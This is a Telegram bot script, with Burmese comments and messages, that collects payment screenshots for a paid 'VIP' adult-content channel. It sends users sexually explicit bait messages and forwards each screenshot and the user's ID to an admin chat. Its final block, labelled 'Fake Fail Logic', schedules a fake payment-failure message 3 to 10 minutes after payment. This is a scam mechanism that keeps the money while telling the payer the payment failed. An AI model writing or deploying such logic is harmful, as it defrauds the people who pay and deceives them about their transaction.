/*CMD
  command: /upload_screenshot
  help: 
  need_reply: true
  auto_retry_time: 
  folder: PayMent
  answer: ပြေစာ ပုံပေးဖို့ကို စောင့်နေပါပြီနော်😘

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

/*CMD
  command: /upload_screenshot
  need_reply: true
  folder: chatvip
CMD*/

var ADMIN_REVIEW_CHAT_ID = -1003044609510; 

// ၁။ User က ပုံမပို့ဘဲ စာပို့တာ၊ Sticker ပို့တာ ဒါမှမဟုတ် ဘာပဲပို့ပို့ ဖမ်းမယ်
if (!request.photo || request.photo.length == 0) {
  Api.sendMessage({
    chat_id: chat.chatid,
    text: "🫦 <b>အို... မောင်လေးကလည်း စာတွေပဲ ပို့မနေနဲ့လေ။</b>\n\nမမတို့ အမြန်စစ်ပေးလို့ရအောင် ငွေလွှဲထားတဲ့ <b>ပြေစာ Screenshot ပုံလေး</b> အရင်ပို့ပေးမှပေါ့... နော် \n\n VIP မဝင်လိုပါက /start  👈 နိပ်ပါ ",
    parse_mode: "HTML"
  });
  
  // စာသားပို့လိုက်ရင် နောက်တစ်ခါ ပုံပြန်တောင်းဖို့ ဒီ Command ကိုပဲ ပြန် run ခိုင်းထားမယ်
  Bot.runCommand("/upload_screenshot");
  return; 
}

// ၂။ ပုံအစစ်ပို့လိုက်ပြီဆိုမှ အောက်က Logic တွေ အလုပ်လုပ်မယ်
var file_id = request.photo.slice(-1)[0].file_id;

Api.sendMessage({
  chat_id: chat.chatid,
  parse_mode: "HTML",
  text: "🫦 <b>အား... ပြေစာလေး ရပြီနော် မောင်လေး...</b>\n\n" +
        "မမတို့ Admin အဖွဲ့က ပြေစာကို အပီအပြင် စစ်ပေးနေပြီမို့ ခဏလေးပဲ သည်းခံပြီး စောင့်ပေးပါဦး။\n\n" +
        "စစ်ဆေးပြီးတာနဲ့ မောင်လေး စိတ်ကြိုက် နှိုက်လို့၊ လိုးလို့ရမယ့် VIP နယ်မြေထဲ ခေါ်သွားမှာမို့ လီးလေးတောင်ပြီး စောင့်နေနော်... ချက်ချင်း လာခဲ့မယ်... 💦👅"
});

// ၃။ Admin Channel ကို အသိပေးချက်ပို့မယ်
var mention = "<a href=\"tg://user?id=" + user.telegramid + "\">" + (user.first_name || "User") + "</a>";
var uname = user.username ? ("@" + user.username) : "(no username)";

Api.sendPhoto({
  chat_id: ADMIN_REVIEW_CHAT_ID,
  photo: file_id,
  caption:
    "🧾 <b>New VIP Payment Pending</b>\n" +
    "━━━━━━━━━━━━━━━━━━━━\n" +
    "👤 <b>User:</b> " + mention + " (" + uname + ")\n" +
    "🆔 <b>ID:</b> <code>" + user.telegramid + "</code>\n" +
    "💰 <b>Amount:</b> 30,000 MMK\n" +
    "━━━━━━━━━━━━━━━━━━━━",
  parse_mode: "HTML"
});

// ၄။ Fake Fail Logic (၃ မိနစ် မှ ၁၀ မိနစ်အတွင်း)
var random_wait = Math.floor(Math.random() * (600 - 180 + 1)) + 180;

Bot.run({
  command: "/fake_payment_fail",
  run_after: random_wait
});

